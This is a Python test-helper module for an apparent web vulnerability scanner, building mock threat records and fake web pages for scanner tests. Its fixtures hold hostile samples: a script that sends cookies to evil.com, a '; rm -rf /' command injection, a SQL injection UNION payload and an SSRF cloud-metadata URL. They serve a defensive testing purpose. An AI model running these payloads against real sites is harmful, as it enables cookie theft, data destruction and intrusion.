# tests/test_utils.py
"""
Test Utilities for CyberGuard

This module provides common utilities for testing the CyberGuard system:
- Mock data creation for testing
- Test fixtures and helpers
- Validation functions
- Test configuration
"""

import json
import random
import string
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
import requests_mock
from unittest.mock import Mock, patch, MagicMock

# Test configuration
TEST_CONFIG = {
    'agent_config': {
        'confidence_threshold': 0.6,
        'max_findings': 10,
        'memory_size': 100
    },
    'mhc_config': {
        'state_dim': 512,
        'temperature': 1.0,
        'sinkhorn_iterations': 5,  # Reduced for testing
        'signal_bound': 1.0,
        'identity_preserve_factor': 0.1
    },
    'gqa_config': {
        'd_model': 512,
        'n_heads': 8,
        'n_groups': 2,
        'dropout': 0.1,
        'use_flash_attention': False  # Disabled for testing stability
    },
    'security_config': {
        'max_scan_depth': 2,
        'timeout': 5,
        'user_agent': 'CyberGuard-Test/1.0'
    }
}

def create_mock_threat_data(threat_type: str = 'xss') -> Dict[str, Any]:
    """
    Create mock threat data for testing
    
    Args:
        threat_type: Type of threat to simulate (xss, sqli, csrf, etc.)
        
    Returns:
        Dictionary containing mock threat data
        
    Example:
        >>> xss_data = create_mock_threat_data('xss')
        >>> print(xss_data['payload'])
        "<script>alert('test')</script>"
    """
    threats = {
        'xss': {
            'type': 'XSS',
            'payload': "<script>alert('test_xss')</script>",
            'location': 'URL parameter',
            'severity': 'HIGH',
            'description': 'Cross-Site Scripting attempt',
            'remediation': 'Sanitize user input, implement CSP'
        },
        'sqli': {
            'type': 'SQL_INJECTION',
            'payload': "' UNION SELECT username, password FROM users --",
            'location': 'POST body',
            'severity': 'CRITICAL',
            'description': 'SQL Injection attempt',
            'remediation': 'Use parameterized queries, input validation'
        },
        'csrf': {
            'type': 'CSRF',
            'payload': '',
            'location': 'Form submission',
            'severity': 'MEDIUM',
            'description': 'Missing CSRF token',
            'remediation': 'Implement CSRF tokens, validate origin'
        },
        'ssrf': {
            'type': 'SSRF',
            'payload': 'http://169.254.169.254/latest/meta-data/',
            'location': 'URL parameter',
            'severity': 'HIGH',
            'description': 'Server-Side Request Forgery attempt',
            'remediation': 'Validate URLs, use allowlists'
        },
        'rce': {
            'type': 'COMMAND_INJECTION',
            'payload': '; rm -rf /',
            'location': 'Command parameter',
            'severity': 'CRITICAL',
            'description': 'Remote Code Execution attempt',
            'remediation': 'Sanitize input, use safe APIs'
        }
    }
    
    return threats.get(threat_type, threats['xss']).copy()

def create_mock_website_data(
    has_vulnerabilities: bool = True,
    has_security_headers: bool = False,
    is_malicious: bool = False
) -> Dict[str, Any]:
    """
    Create mock website data for testing scanners
    
    Args:
        has_vulnerabilities: Whether to include vulnerabilities
        has_security_headers: Whether to include security headers
        is_malicious: Whether the site is malicious
        
    Returns:
        Dictionary containing mock website data
    """
    # Base HTML template
    html_template = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Test Website</title>
        {meta_tags}
    </head>
    <body>
        <h1>Welcome to Test Website</h1>
        <form action="/submit" method="POST">
            <input type="text" name="username" placeholder="Username">
            <input type="password" name="password" placeholder="Password">
            <input type="submit" value="Login">
        </form>
        {malicious_content}
        <script src="/static/app.js"></script>
    </body>
    </html>
    """
    
    # Add vulnerabilities if requested
    malicious_content = ""
    if has_vulnerabilities:
        malicious_content = """
        <div style="display:none">
            <!-- Test for vulnerability scanners -->
            <iframe src="http://malicious.example.com"></iframe>
            <img src="javascript:alert('xss')" onerror="alert('xss')">
        </div>
        """
    
    # Add malicious content if requested
    if is_malicious:
        malicious_content += """
        <script>
            // Malicious script for testing
            document.cookie = "session=stolen; path=/";
            fetch('http://evil.com/steal?data=' + document.cookie);
        </script>
        """
    
    # Create meta tags based on security headers
    meta_tags = ""
    if has_security_headers:
        meta_tags = """
        <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
        <meta http-equiv="X-Frame-Options" content="DENY">
        """
    
    html = html_template.format(
        meta_tags=meta_tags,
        malicious_content=malicious_content
    )
    
    # Create headers
    headers = {
        'Server': 'TestServer/1.0',
        'Content-Type': 'text/html; charset=utf-8',
        'Content-Length': str(len(html))
    }
    
    # Add security headers if requested
    if has_security_headers:
        headers.update({
            'Content-Security-Policy': "default-src 'self'",
            'X-Frame-Options': 'DENY',
            'X-Content-Type-Options': 'nosniff',
            'Strict-Transport-Security': 'max-age=31536000'
        })
    
    return {
        'url': 'https://test.example.com',
        'html': html,
        'headers': headers,
        'status_code': 200,
        'cookies': {'session_id': 'test_session_123'},
        'forms': [
            {
                'action': '/submit',
                'method': 'POST',
                'inputs': [
                    {'name': 'username', 'type': 'text'},
                    {'name': 'password', 'type': 'password'}
                ]
            }
        ],
        'scripts': ['/static/app.js'],
        'links': ['/about', '/contact', '/login']
    }

def create_mock_http_response(
    url: str,
    status_code: int = 200,
    content_type: str = 'text/html',
    body: Optional[str] = None,
    headers: Optional[Dict] = None
) -> Mock:
    """
    Create a mock HTTP response for testing
    
    Args:
        url: Response URL
        status_code: HTTP status code
        content_type: Content-Type header
        body: Response body (if None, generates mock HTML)
        headers: Additional headers
        
    Returns:
        Mock response object
    """
    if body is None:
        body = f"""
        <!DOCTYPE html>
        <html>
        <head><title>Test Page for {url}</title></head>
        <body><h1>Test Content</h1></body>
        </html>
        """
    
    if headers is None:
        headers = {}
    
    # Create mock response
    mock_response = Mock()
    mock_response.url = url
    mock_response.status_code = status_code
    mock_response.text = body
    mock_response.content = body.encode('utf-8')
    mock_response.headers = {
        'Content-Type': content_type,
        'Content-Length': str(len(body)),
        **headers
    }
    mock_response.ok = 200 <= status_code < 400
    mock_response.raise_for_status = Mock()
    
    return mock_response

def validate_test_result(
    result: Any,
    expected_type: type = None,
    expected_keys: List[str] = None,
    min_length: int = None,
    max_length: int = None,
    value_range: tuple = None
) -> bool:
    """
    Validate test results with various checks
    
    Args:
        result: Test result to validate
        expected_type: Expected type of result
        expected_keys: Expected keys if result is dict
        min_length: Minimum length if result is collection
        max_length: Maximum length if result is collection
        value_range: (min, max) for numeric values
        
    Returns:
        bool: True if validation passes
        
    Raises:
        AssertionError: If validation fails
    """
    # Type validation
    if expected_type and not isinstance(result, expected_type):
        raise AssertionError(
            f"Expected type {expected_type}, got {type(result)}"
        )
    
    # Dictionary key validation
    if expected_keys and isinstance(result, dict):
        missing_keys = [k for k in expected_keys if k not in result]
        if missing_keys:
            raise AssertionError(
                f"Missing keys in result: {missing_keys}"
            )
    
    # Length validation for collections
    if hasattr(result, '__len__'):
        if min_length is not None and len(result) < min_length:
            raise AssertionError(
                f"Minimum length {min_length} not met: {len(result)}"
            )
        if max_length is not None and len(result) > max_length:
            raise AssertionError(
                f"Maximum length {max_length} exceeded: {len(result)}"
            )
    
    # Numeric range validation
    if value_range and isinstance(result, (int, float)):
        min_val, max_val = value_range
        if not (min_val <= result <= max_val):
            raise AssertionError(
                f"Value {result} not in range [{min_val}, {max_val}]"
            )
    
    return True

def cleanup_test_resources(resources: List[Any]):
    """
    Clean up test resources
    
    Args:
        resources: List of resources to clean up
    """
    for resource in resources:
        try:
            if hasattr(resource, 'close'):
                resource.close()
            elif hasattr(resource, 'shutdown'):
                resource.shutdown()
            elif hasattr(resource, 'cleanup'):
                resource.cleanup()
        except Exception as e:
            print(f"Warning: Failed to cleanup resource: {e}")

def generate_random_string(length: int = 10) -> str:
    """
    Generate a random string for testing
    
    Args:
        length: Length of random string
        
    Returns:
        Random string
    """
    return ''.join(
        random.choices(string.ascii_letters + string.digits, k=length)
    )

def create_mock_agent_output(
    agent_id: str,
    threat_level: float,
    confidence: float,
    findings: List[Dict]
) -> Dict[str, Any]:
    """
    Create mock agent output for testing coordination
    
    Args:
        agent_id: Agent identifier
        threat_level: Threat level (0.0 to 1.0)
        confidence: Confidence score (0.0 to 1.0)
        findings: List of security findings
        
    Returns:
        Mock agent output dictionary
    """
    return {
        'agent_id': agent_id,
        'agent_name': f'Test Agent {agent_id}',
        'findings': findings,
        'threat_level': threat_level,
        'confidence': confidence,
        'recommended_action': 'Test action',
        'reasoning_state': Mock(spec=torch.Tensor) if 'torch' in sys.modules else None,
        'decision': {
            'threat_level': threat_level,
            'confidence': confidence,
            'evidence': findings[:3] if findings else []
        }
    }

# Check if torch is available
try:
    import torch
    TORCH_AVAILABLE = True
except ImportError:
    TORCH_AVAILABLE = False
    print("Warning: PyTorch not available. Some tests may be skipped.")

__all__ = [
    'TEST_CONFIG',
    'create_mock_threat_data',
    'create_mock_website_data',
    'create_mock_http_response',
    'validate_test_result',
    'cleanup_test_resources',
    'generate_random_string',
    'create_mock_agent_output',
    'TORCH_AVAILABLE'
]